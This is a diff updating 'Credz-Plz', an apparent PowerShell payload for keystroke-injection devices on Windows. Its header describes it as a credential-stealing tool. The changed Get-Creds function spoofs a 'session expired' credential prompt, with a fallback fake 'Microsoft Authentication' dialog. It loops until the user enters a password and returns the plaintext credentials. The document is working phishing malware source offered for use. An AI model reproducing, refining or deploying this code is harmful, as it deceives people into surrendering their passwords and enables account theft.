@@ -2,7 +2,7 @@
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.2               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Version      : 1.3               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
 # Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
@@ -53,110 +53,115 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 function Get-Creds {
 
-    Add-Type -AssemblyName PresentationCore,PresentationFramework,System.Windows.Forms
-    $form = $null
-
-    while ($form -eq $null)
-    {
+    while ($true) {
         try {
-            # Create a custom credential form using WPF/WinForms
+            # Use native Windows CredUI API (most reliable)
+            $cred = $host.ui.promptforcredential('Failed Authentication', 'Your session has expired. Please re-authenticate.', "$([Environment]::UserDomainName)\$([Environment]::UserName)", "$([Environment]::UserDomainName)")
+            
+            if ($cred -and -not [string]::IsNullOrWhiteSpace($cred.GetNetworkCredential().Password)) {
+                return @{
+                    UserName = $cred.UserName
+                    Password = $cred.GetNetworkCredential().Password
+                    Domain = $cred.GetNetworkCredential().Domain
+                }
+            }
+            else {
+                # Show error and loop again
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
+                [System.Windows.MessageBox]::Show("Invalid credentials. Please try again.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Stop) | Out-Null
+            }
+        }
+        catch {
+            # Fallback to simple password prompt if CredUI fails
+            Add-Type -AssemblyName System.Windows.Forms
+            
             $form = New-Object System.Windows.Forms.Form
-            $form.Text = "Authentication Required"
-            $form.Size = New-Object System.Drawing.Size(350,180)
+            $form.Text = "Microsoft Authentication"
+            $form.Size = New-Object System.Drawing.Size(350,200)
             $form.StartPosition = "CenterScreen"
             $form.TopMost = $true
             $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
             $form.MaximizeBox = $false
             $form.MinimizeBox = $false
-            $form.ShowInTaskbar = $false
             
-            # Message label
-            $msgLabel = New-Object System.Windows.Forms.Label
-            $msgLabel.Location = New-Object System.Drawing.Point(10,10)
-            $msgLabel.Size = New-Object System.Drawing.Size(320,30)
-            $msgLabel.Text = "Unusual sign-in activity. Please verify your account."
-            $form.Controls.Add($msgLabel)
+            $label = New-Object System.Windows.Forms.Label
+            $label.Location = New-Object System.Drawing.Point(10,10)
+            $label.Size = New-Object System.Drawing.Size(330,40)
+            $label.Text = "Your credentials are required to continue."
+            $form.Controls.Add($label)
             
-            # Username label and textbox
             $userLabel = New-Object System.Windows.Forms.Label
-            $userLabel.Location = New-Object System.Drawing.Point(10,45)
+            $userLabel.Location = New-Object System.Drawing.Point(10,50)
             $userLabel.Size = New-Object System.Drawing.Size(80,20)
             $userLabel.Text = "Username:"
             $form.Controls.Add($userLabel)
             
             $userText = New-Object System.Windows.Forms.TextBox
-            $userText.Location = New-Object System.Drawing.Point(100,45)
+            $userText.Location = New-Object System.Drawing.Point(100,50)
             $userText.Size = New-Object System.Drawing.Size(230,20)
             $userText.Text = "$([Environment]::UserDomainName)\$([Environment]::UserName)"
             $form.Controls.Add($userText)
             
-            # Password label and textbox
             $passLabel = New-Object System.Windows.Forms.Label
-            $passLabel.Location = New-Object System.Drawing.Point(10,75)
+            $passLabel.Location = New-Object System.Drawing.Point(10,80)
             $passLabel.Size = New-Object System.Drawing.Size(80,20)
             $passLabel.Text = "Password:"
             $form.Controls.Add($passLabel)
             
             $passText = New-Object System.Windows.Forms.TextBox
-            $passText.Location = New-Object System.Drawing.Point(100,75)
+            $passText.Location = New-Object System.Drawing.Point(100,80)
             $passText.Size = New-Object System.Drawing.Size(230,20)
             $passText.UseSystemPasswordChar = $true
+            $passText.TabIndex = 1
             $form.Controls.Add($passText)
             
-            # OK Button
-            $okButton = New-Object System.Windows.Forms.Button
-            $okButton.Location = New-Object System.Drawing.Point(175,110)
-            $okButton.Size = New-Object System.Drawing.Size(75,23)
-            $okButton.Text = "OK"
-            $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
-            $form.AcceptButton = $okButton
-            $form.Controls.Add($okButton)
+            $okBtn = New-Object System.Windows.Forms.Button
+            $okBtn.Location = New-Object System.Drawing.Point(170,120)
+            $okBtn.Size = New-Object System.Drawing.Size(80,25)
+            $okBtn.Text = "OK"
+            $okBtn.DialogResult = [System.Windows.Forms.DialogResult]::OK
+            $okBtn.Add_Click({
+                if ([string]::IsNullOrWhiteSpace($passText.Text)) {
+                    [System.Windows.Forms.MessageBox]::Show("Password cannot be empty!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Exclamation) | Out-Null
+                    $passText.Focus()
+                } else {
+                    $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
+                    $form.Close()
+                }
+            })
+            $form.Controls.Add($okBtn)
+            $form.AcceptButton = $okBtn
             
-            # Cancel Button
-            $cancelButton = New-Object System.Windows.Forms.Button
-            $cancelButton.Location = New-Object System.Drawing.Point(255,110)
-            $cancelButton.Size = New-Object System.Drawing.Size(75,23)
-            $cancelButton.Text = "Cancel"
-            $cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
-            $form.CancelButton = $cancelButton
-            $form.Controls.Add($cancelButton)
+            $cancelBtn = New-Object System.Windows.Forms.Button
+            $cancelBtn.Location = New-Object System.Drawing.Point(260,120)
+            $cancelBtn.Size = New-Object System.Drawing.Size(80,25)
+            $cancelBtn.Text = "Cancel"
+            $cancelBtn.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+            $form.CancelButton = $cancelBtn
+            $form.Controls.Add($cancelBtn)
             
-            # Keep form on top and in focus
             $form.Add_Shown({
-                $form.Activate()
                 $form.TopMost = $true
-                [System.Windows.Forms.SendKeys]::SendWait("")
-                $passText.Select()
+                $form.Activate()
+                $passText.Focus()
             })
             
             $result = $form.ShowDialog()
             
             if ($result -eq [System.Windows.Forms.DialogResult]::OK -and -not [string]::IsNullOrWhiteSpace($passText.Text)) {
-                $creds = @{
+                $form.Close()
+                $form.Dispose()
+                
+                return @{
                     UserName = $userText.Text
                     Password = $passText.Text
                     Domain = ([Environment]::UserDomainName)
                 }
-                $form.Close()
-                $form.Dispose()
-                return $creds
             }
             else {
-                if ([string]::IsNullOrWhiteSpace($passText.Text)) {
-                    [System.Windows.Forms.MessageBox]::Show("Password cannot be empty!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Stop) | Out-Null
-                }
-                $form.Close()
-                $form.Dispose()
-                $form = $null
-            }
-        }
-        catch {
-            if ($form) { 
                 $form.Close()
                 $form.Dispose()
             }
-            Write-Host "Error in credential capture: $_"
-            $form = $null
         }
     }
 }
